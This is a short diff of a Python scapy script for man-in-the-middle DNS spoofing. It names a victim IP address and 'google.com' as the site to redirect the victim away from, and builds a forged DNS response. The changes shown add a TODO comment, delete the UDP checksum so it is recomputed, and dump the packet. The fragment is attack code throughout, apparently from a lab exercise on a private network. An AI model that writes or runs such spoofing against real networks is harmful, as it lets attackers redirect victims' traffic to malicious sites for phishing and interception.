@@ -1,4 +1,5 @@
 from scapy.all import *
+# TODO 
 
 ipVictim = '192.168.178.144' # The IP address of the victim
 goodSite = 'google.com' # The website we want to redirect them from
@@ -30,6 +31,8 @@ def MIMspoofDNS(pkt, goodSite, evilSite) :
     EvilDNSResponse[IP].src = pkt[IP].dst
     EvilDNSResponse[UDP].dport = pkt[UDP].sport
     EvilDNSResponse[UDP].sport = pkt[UDP].dport
+    del EvilDNSResponse[UDP].chksum
+    EvilDNSResponse[UDP].show2(dump = True)
     EvilDNSResponse[DNS].rd = pkt[DNS].rd
     EvilDNSResponse[DNS].qd = pkt[DNS].qd
     EvilDNSResponse[DNS].qr = 1
